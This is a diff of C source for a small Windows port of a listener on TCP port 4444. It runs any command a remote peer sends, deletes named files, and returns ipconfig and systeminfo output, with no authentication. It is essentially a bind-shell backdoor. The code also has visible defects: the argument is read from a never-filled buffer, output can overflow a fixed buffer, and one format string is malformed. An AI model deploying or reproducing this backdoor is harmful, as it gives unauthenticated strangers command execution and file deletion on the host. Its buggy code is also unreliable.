@@ -1,122 +1,214 @@
-/* Dependencies */
-
 #include <stdio.h>
-#include <unistd.h>
-#include <sys/socket.h>
+#include <winsock2.h>
 #include <stdlib.h>
-#include <netinet/in.h>
 #include <string.h>
+#include <unistd.h>
 
-/* Header file with function prototypes */
-
-#include "interface.h"
-
-/* Function Definitions for all features */
-
-void run_command(int sockfd, const char *argument)
+int recvTimeOutTCP(SOCKET socket, long sec, long usec)
 {
-    dup2(sockfd, 1);
-    dup2(sockfd, 0);
-    system(argument);
+   struct timeval timeout;
+   struct fd_set fds;
+
+   timeout.tv_sec = sec; //assign the second value
+   timeout.tv_usec = usec; //assign the micro second value
+
+   FD_ZERO(&fds);
+   FD_SET(socket, &fds);
+
+   return select(0, &fds, 0, 0, &timeout); //return -1 on error, 0 on timeout, > 0 if data ready
 }
 
-void delete_file(int sockfd, const char *filepath)
+void runCommand(int sockFD, const char *argument)
 {
-    dup2(sockfd, 0);
-    dup2(sockfd, 1);
-    dup2(sockfd, 2);
+    FILE *fp;
+    char path[1035];
+    char output[1024] = {0};
+    int sentData;
 
-    if (remove(filepath) == 0)
+    fp = popen(argument, "r");
+
+    if (fp == NULL)
     {
-       printf("File deleted successfully!\n");
+        printf("Failed to execute command.\n");
+	exit(1);
+    }
+
+    while (fgets(path, sizeof(path), fp) != NULL)
+    {
+        strcat(output, path);
+    }
+
+    sentData = send(sockFD, output, strlen(output), 0);
+}
+
+void deleteFile(int sockFD, const char *argument)
+{
+    int sentData;
+    char success[] = "File deleted successfully!\n";
+    char failure[] = "File could not be deleted!\n";
+
+    if (remove(argument) == 0)
+    {
+        sentData = send(sockFD, success, strlen(success), 0);
+    }
+
+    else 
+    {
+        sentData = send(sockFD, failure, strlen(failure), 0);
+    }
+}
+
+void systemInfo(int sockFD)
+{
+    FILE *fp;
+    char path[1035];
+    char output[1024] = {0};
+    int sentData;
+
+    fp = popen("ipconfig & systeminfo", "r");
+
+    if (fp == NULL)
+    {
+        printf("Failed to execute command.\n");
+	exit(1);
     }
 
     else
     {
-       printf("Error deleting file!\n");
+        while (fgets(path, sizeof(path), fp) != NULL)
+	{
+            strcat(output, path);
+	}
+        sentData = send(sockFD, output, strlen(output), 0);	
     }
 }
 
-void system_info(int sockfd)
-{
-    dup2(sockfd, 0);
-    dup2(sockfd, 1);
-    dup2(sockfd, 2);
-
-    system("ipconfig & systeminfo");
-}
-
-void networking_information(int sockfd)
-{
-    dup2(sockfd, 0);
-    dup2(sockfd, 1);
-    dup2(sockfd, 2);
-
-    system("netstat -ano");
-}
-
-const char *parse_feature(char input[])
+const char *parseFeature(char input[])
 {
     char *token = strtok(input, "(");
     return token;
 }
 
-const char *parse_argument(char input[])
+const char *parseArgument(char input[])
 {
     char *token;
     strtok(input, "(");
     token = strtok(NULL, ")");
     return token;
-
 }
 
-/* Main function, handles socket and networking */
-
-int main(void)
+int main (int argc, char *argv[])
 {
-    int server_fd, new_socket, valread;
+    WSADATA wsaData;
+    SOCKET ListeningSocket, NewConnection;
+    SOCKADDR_IN ServerAddr, SenderInfo;
+
+    int port = 4444;
+    int BytesReceived, i, nlen, SelectTiming;
     char buffer[1024] = {0};
-    char copy[1024] = {0};
+    char buffer_1[1024] = {0};
 
-    struct sockaddr_in address;
-    int addrlen = sizeof(address);
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+    {
+        printf("Winsock initialization failed: %ld.\n", WSAGetLastError());
+	return 1;
+    }
 
-    server_fd = socket(AF_INET, SOCK_STREAM, 0);
-    
-    address.sin_family = AF_INET;
-    address.sin_port = htons(4444);
-    address.sin_addr.s_addr = INADDR_ANY;
+    else
+    {
+        printf("Ready to use, status: %s.\n", wsaData.szSystemStatus);
+    }
 
-    bind(server_fd, (struct sockaddr *)&address, addrlen);
-    listen(server_fd, 3);
+    if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) //could not find usable winsock DLL
+    {
+        printf("Could not find usable winsock DLL 5u.%u\n.", LOBYTE(wsaData.wVersion), HIBYTE(wsaData.wVersion));
+	WSACleanup();
+	return 1;
+    }
 
-    new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);
+    else
+    {
+        printf("DLL supports the winsock version\n");
+    }
 
-    while(1){
-        valread = read(new_socket, buffer, 1024);
+    ListeningSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
-        strncpy(copy, buffer, 1024);
+    if (ListeningSocket == INVALID_SOCKET)
+    {
+        printf("Error making socket: %ld.\n", WSAGetLastError());
+	WSACleanup();
+	return 1;
+    }
 
-        const char *feature = parse_feature(buffer);
-        const char *argument = parse_argument(copy);
+    else 
+    {
+        printf("Socket created successfully.\n");
+    }
 
-        /* Call the appropriate function after the feature has been determined */
+    ServerAddr.sin_family = AF_INET;
+    ServerAddr.sin_port = htons(port);
+    ServerAddr.sin_addr.s_addr = htonl(INADDR_ANY);
 
-        if (strcmp(feature, "execute") == 0)
-        {
-           run_command(new_socket, argument);
-        }
+    if (bind(ListeningSocket, (SOCKADDR *)&ServerAddr, sizeof(ServerAddr)) == SOCKET_ERROR)
+    {
+        printf("Bind error.\n");
+	closesocket(ListeningSocket);
+	WSACleanup();
+	return 1;
+    }
 
-        if (strcmp(feature, "delete") == 0)
-        {
-           delete_file(new_socket, argument);
-        }
+    if (listen(ListeningSocket, 5) == SOCKET_ERROR)
+    {
+        printf("Error listening: %ld.\n", WSAGetLastError());
+	closesocket(ListeningSocket);
+	WSACleanup();
+	return 1;
+    }
 
-        if (strcmp(feature, "sysinfo") == 0)
-        {
-           system_info(new_socket);
-        }
+    SelectTiming = recvTimeOutTCP(ListeningSocket, 100, 100);
+
+    switch (SelectTiming)
+    {
+        case 0:
+		printf("Timeout\n");
+		break;
+
+	case -1:
+		printf("Error\n");
+		break;
+
+	default:
+		{
+                    while(1)
+		    {
+                        NewConnection = SOCKET_ERROR;
+			while (NewConnection == SOCKET_ERROR)
+			{
+                            NewConnection = accept(ListeningSocket, NULL, NULL);
+			    BytesReceived = recv(NewConnection, buffer, sizeof(buffer), 0);
+
+                            const char *feature = parseFeature(buffer);
+	                    const char *argument = parseArgument(buffer_1);			    
+
+			    if (strcmp(feature, "execute") == 0)
+			    {
+                                runCommand(NewConnection, argument);
+			    }
+
+			    else if (strcmp(feature, "delete") == 0)
+			    {
+                                deleteFile(NewConnection, argument);
+			    }
+
+			    else if (strcmp(feature, "sysinfo") == 0)
+			    {
+                                systemInfo(NewConnection);
+			    }
+			}
+		    }
+		}
     }
 
     return 0;
+
 }
